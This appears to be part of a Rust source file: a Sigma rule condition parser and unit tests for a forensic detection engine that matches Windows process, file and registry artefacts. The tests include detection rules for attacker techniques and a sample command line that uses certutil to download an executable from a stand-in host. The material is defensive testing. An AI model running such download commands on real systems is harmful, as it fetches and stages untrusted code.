    if p != toks.len() {
        return Err("could not parse condition".into());
    }
    Ok(ast)
}

fn parse_or(t: &[String], p: &mut usize, s: &BTreeMap<String, Search>) -> Result<Ast, String> {
    let mut items = vec![parse_and(t, p, s)?];
    while *p < t.len() && t[*p].eq_ignore_ascii_case("or") {
        *p += 1;
        items.push(parse_and(t, p, s)?);
    }
    Ok(if items.len() == 1 { items.pop().unwrap() } else { Ast::Or(items) })
}

fn parse_and(t: &[String], p: &mut usize, s: &BTreeMap<String, Search>) -> Result<Ast, String> {
    let mut items = vec![parse_not(t, p, s)?];
    while *p < t.len() && t[*p].eq_ignore_ascii_case("and") {
        *p += 1;
        items.push(parse_not(t, p, s)?);
    }
    Ok(if items.len() == 1 { items.pop().unwrap() } else { Ast::And(items) })
}

fn parse_not(t: &[String], p: &mut usize, s: &BTreeMap<String, Search>) -> Result<Ast, String> {
    if *p < t.len() && t[*p].eq_ignore_ascii_case("not") {
        *p += 1;
        return Ok(Ast::Not(Box::new(parse_not(t, p, s)?)));
    }
    parse_atom(t, p, s)
}

fn parse_atom(t: &[String], p: &mut usize, s: &BTreeMap<String, Search>) -> Result<Ast, String> {
    let tok = t.get(*p).ok_or("unexpected end of condition")?.clone();
    if tok == "(" {
        *p += 1;
        let inner = parse_or(t, p, s)?;
        if t.get(*p).map(String::as_str) != Some(")") {
            return Err("unbalanced parentheses in condition".into());
        }
        *p += 1;
        return Ok(inner);
    }
    let lower = tok.to_ascii_lowercase();
    if (lower == "1" || lower == "any" || lower == "all") && t.get(*p + 1).map(|x| x.eq_ignore_ascii_case("of")).unwrap_or(false) {
        let target = t.get(*p + 2).ok_or("incomplete 'of' expression")?.clone();
        *p += 3;
        let names: Vec<String> = if target.eq_ignore_ascii_case("them") {
            s.keys().filter(|k| !k.starts_with('_')).cloned().collect()
        } else {
            let re = regex::Regex::new(&format!("^{}$", wildcard_to_regex(&target))).map_err(|_| "bad identifier pattern")?;
            s.keys().filter(|k| re.is_match(k)).cloned().collect()
        };
        if names.is_empty() {
            return Err(format!("condition references no search ({target})"));
        }
        return Ok(Ast::Quant(lower == "all", names));
    }
    if !s.contains_key(&tok) {
        return Err(format!("condition references unknown search '{tok}'"));
    }
    *p += 1;
    Ok(Ast::Ident(tok))
}

fn build_ast(a: &Ast, s: &BTreeMap<String, Search>, mode: FieldMode) -> Result<Condition, String> {
    Ok(match a {
        Ast::And(v) => Condition::All { all: v.iter().map(|x| build_ast(x, s, mode)).collect::<Result<_, _>>()? },
        Ast::Or(v) => Condition::Any { any: v.iter().map(|x| build_ast(x, s, mode)).collect::<Result<_, _>>()? },
        Ast::Not(x) => Condition::Not { not: Box::new(build_ast(x, s, mode)?) },
        Ast::Ident(n) => build_search(&s[n], mode)?,
        Ast::Quant(all, names) => {
            let parts: Vec<Condition> = names.iter().map(|n| build_search(&s[n], mode)).collect::<Result<_, _>>()?;
            if *all { Condition::All { all: parts } } else { Condition::Any { any: parts } }
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event_rule::event_from_example;
    use std::collections::BTreeMap as M;

    fn load(y: &str) -> SigmaLoad {
        let mut out = SigmaLoad::default();
        load_text(y, "t.yml", &SigmaFilter { min_level: "low".into(), statuses: vec![], disabled: vec![] }, &mut out);
        out
    }
    fn ex(pairs: &[(&str, &str)]) -> M<String, String> {
        pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    }

    const CERTUTIL: &str = r#"
title: Suspicious Certutil Download
id: 11111111-2222-3333-4444-555555555555
status: test
level: high
author: Test Author
tags: [attack.command-and-control, attack.t1105]
logsource: {product: windows, category: process_creation}
detection:
  selection_img:
    - Image|endswith: '\certutil.exe'
    - OriginalFileName: 'CertUtil.exe'
  selection_cli:
    CommandLine|contains|windash: ['-urlcache', '-verifyctl']
  filter_main:
    ParentImage|endswith: '\trusted.exe'
  condition: all of selection_* and not 1 of filter_*
"#;

    #[test]
    fn process_creation_with_windash_and_filters() {
        let l = load(CERTUTIL);
        assert_eq!(l.loaded, 1, "{:?}", l.skipped_examples);
        let r = &l.rules[0];
        assert_eq!(r.id, "sigma:11111111-2222-3333-4444-555555555555");
        assert_eq!(r.attack, vec!["T1105"]);
        let hit = event_from_example(&ex(&[("artefact", "evtx"), ("action", "process.start"),
            ("process.path", r"C:\Windows\System32\certutil.exe"), ("process.command_line", "certutil /urlcache -f http://x/a.exe a.exe")]));
        assert!(r.matches(&hit));
        let filtered = event_from_example(&ex(&[("artefact", "evtx"), ("action", "process.start"),
            ("process.path", r"C:\Windows\System32\certutil.exe"), ("process.command_line", "certutil -urlcache x"), ("process.parent_name", r"C:\x\trusted.exe")]));
        assert!(!r.matches(&filtered));
        // Needs a command line, so Prefetch evidence alone must not fire.
        let pf = event_from_example(&ex(&[("artefact", "prefetch"), ("process.name", "CERTUTIL.EXE")]));
        assert!(!r.matches(&pf));
    }

    #[test]
    fn image_only_rule_also_runs_on_execution_artefacts() {
        let y = r#"
title: Rare tool
id: aaaaaaaa-0000-0000-0000-000000000001
status: test
level: high
logsource: {product: windows, category: process_creation}
detection:
  selection: {Image|endswith: '\psexesvc.exe'}
  condition: selection
"#;
        let l = load(y);
        let r = &l.rules[0];
        assert!(!r.matches(&event_from_example(&ex(&[("artefact", "prefetch"), ("process.name", "PSEXESVC.EXE")]))));
        assert!(r.matches(&event_from_example(&ex(&[("artefact", "amcache"), ("process.path", r"C:\Windows\PSEXESVC.exe")]))));
        assert!(!r.matches(&event_from_example(&ex(&[("artefact", "mft"), ("target.path", "Windows/PSEXESVC.exe")]))));
    }

    /// Regression: a "system binary outside System32" rule must not fire on
    /// Prefetch (no directory recorded) — it produced hundreds of false hits.
    #[test]
    fn location_anomaly_rules_skip_name_only_evidence() {
        let y = r#"
title: System File Execution Location Anomaly
id: aaaaaaaa-0000-0000-0000-000000000009
status: test
level: high
logsource: {product: windows, category: process_creation}
detection:
  selection: {Image|endswith: ['\svchost.exe', '\wermgr.exe']}
  filter: {Image|startswith: ['C:\Windows\System32\', 'C:\Windows\SysWOW64\']}
  condition: selection and not filter
"#;
        let l = load(y);
        let r = &l.rules[0];
        assert!(!r.matches(&event_from_example(&ex(&[("artefact", "prefetch"), ("process.name", "SVCHOST.EXE"), ("process.path", "SVCHOST.EXE")]))));
        assert!(!r.matches(&event_from_example(&ex(&[("artefact", "amcache"), ("process.path", r"C:\Windows\System32\svchost.exe")]))));
        assert!(r.matches(&event_from_example(&ex(&[("artefact", "amcache"), ("process.path", r"C:\Users\Public\svchost.exe")]))));
    }

    #[test]
    fn security_service_rule_reads_eventdata() {
        let y = r#"
title: Service installed
id: aaaaaaaa-0000-0000-0000-000000000002
status: test
level: medium
logsource: {product: windows, service: system}
detection:
  selection:
    Provider_Name: 'Service Control Manager'
    EventID: 7045
    ImagePath|contains: '\Users\Public\'
  condition: selection
"#;
        let l = load(y);
        assert_eq!(l.loaded, 1, "{:?}", l.skipped_examples);
        let r = &l.rules[0];
        let mut e = event_from_example(&ex(&[("artefact", "evtx")]));
        e.raw = serde_json::json!({"Event": {"System": {"EventID": 7045, "Channel": "System",
            "Provider": {"#attributes": {"Name": "Service Control Manager"}}},
            "EventData": {"ImagePath": "C:\\Users\\Public\\svc.exe", "ServiceName": "x"}}});
        assert!(r.matches(&e));
        e.raw["Event"]["EventData"]["ImagePath"] = serde_json::json!("C:\\Windows\\System32\\svc.exe");
        assert!(!r.matches(&e));
    }

    #[test]
    fn unsupported_things_are_skipped_with_reasons() {
        let l = load(r#"
title: Linux thing
logsource: {product: linux, category: process_creation}
detection: {sel: {Image: '/bin/sh'}, condition: sel}
level: high
status: test
---
title: CIDR thing
logsource: {product: windows, category: network_connection}
detection: {sel: {DestinationIp|cidr: '10.0.0.0/8'}, condition: sel}
level: high
status: test
---
title: Count thing
logsource: {product: windows, service: security}
detection: {sel: {EventID: 4625}, condition: sel | count() > 5}
level: high
status: test
"#);
        assert_eq!(l.loaded, 0);
        assert_eq!(l.skipped_by_reason.values().sum::<usize>(), 3, "{:?}", l.skipped_by_reason);
    }

    /// Load a real SigmaHQ checkout when SIGMA_DIR is set (skipped otherwise):
    /// prints the load summary and checks the whole set compiles and runs.
    #[test]
    fn real_sigma_corpus_when_available() {
        let Ok(dir) = std::env::var("SIGMA_DIR") else { return };
        for f in [SigmaFilter::default(), SigmaFilter { min_level: "informational".into(), statuses: vec!["stable".into(), "test".into(), "experimental".into()], disabled: vec![] }] {
            let t = std::time::Instant::now();
            let l = load_dir(Path::new(&dir), &f);
            let load_ms = t.elapsed().as_millis();
            let t = std::time::Instant::now();
            let mut c = crate::event_rule::GatedRules::new(&l.rules);
            let compile_ms = t.elapsed().as_millis();
            let evs = vec![
                event_from_example(&ex(&[("artefact", "evtx"), ("action", "process.start"),
                    ("process.path", r"C:\Windows\System32\cmd.exe"), ("process.command_line", "cmd.exe /c whoami /all")])),
                event_from_example(&ex(&[("artefact", "mft"), ("action", "file.modified"), ("target.path", "Users/u/AppData/Local/Temp/x.tmp")])),
                event_from_example(&ex(&[("artefact", "prefetch"), ("action", "execution.prefetch"), ("process.name", "CMD.EXE")])),
            ];
            let (mut h, mut o) = (Vec::new(), Vec::new());
            for ev in &evs { c.matching(ev, &mut h, &mut o); } // warm the per-key caches
            let mut times = Vec::new();
            for ev in &evs {
                let t = std::time::Instant::now();
                for _ in 0..2000 { c.matching(ev, &mut h, &mut o); }
                times.push(format!("{:.1}", t.elapsed().as_micros() as f64 / 2000.0));
            }
            let per_ev_us = times.join(" / ");
            eprintln!("SIGMA filter={:?}/{:?} files={} loaded={} filtered={} load={}ms compile={}ms eval(process/mft/prefetch)={}us/event",
                f.min_level, f.statuses, l.files_seen, l.loaded, l.filtered, load_ms, compile_ms, per_ev_us);
            eprintln!("  by source: {:?}", l.loaded_by_source);
            eprintln!("  skipped: {:?}", l.skipped_by_reason);
            assert!(l.loaded > 0);
        }
    }

    #[test]
    fn missing_folder_is_reported_not_fatal() {
        let l = load_dir(Path::new("/definitely/not/here"), &SigmaFilter::default());
        assert!(l.folder_error.is_some());
        assert_eq!(l.loaded, 0);
    }

    #[test]
    fn mft_and_registry_branches() {
        let f = load(r#"
title: Drop in startup
id: aaaaaaaa-0000-0000-0000-000000000003
status: test
level: high
logsource: {product: windows, category: file_event}
detection: {sel: {TargetFilename|contains: '\Start Menu\Programs\Startup\'}, condition: sel}
"#);
        let r = &f.rules[0];
        assert!(r.matches(&event_from_example(&ex(&[("artefact", "mft"), ("action", "file.created"),
            ("target.path", "Users/u/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.lnk")]))));
        let g = load(r#"
title: Run key to public
id: aaaaaaaa-0000-0000-0000-000000000004
status: test
level: high
logsource: {product: windows, category: registry_set}
detection:
  sel:
    TargetObject|contains: '\CurrentVersion\Run'
    Details|contains: '\Users\Public\'
  condition: sel
"#);
        let r = &g.rules[0];
        let mut e = event_from_example(&ex(&[("artefact", "registry_run"), ("target.path", r"C:\Users\Public\a.exe")]));
        e.provenance.source_ref = Some(r"ROOT\Software\Microsoft\Windows\CurrentVersion\Run\Updater".into());
        assert!(r.matches(&e));
    }
}
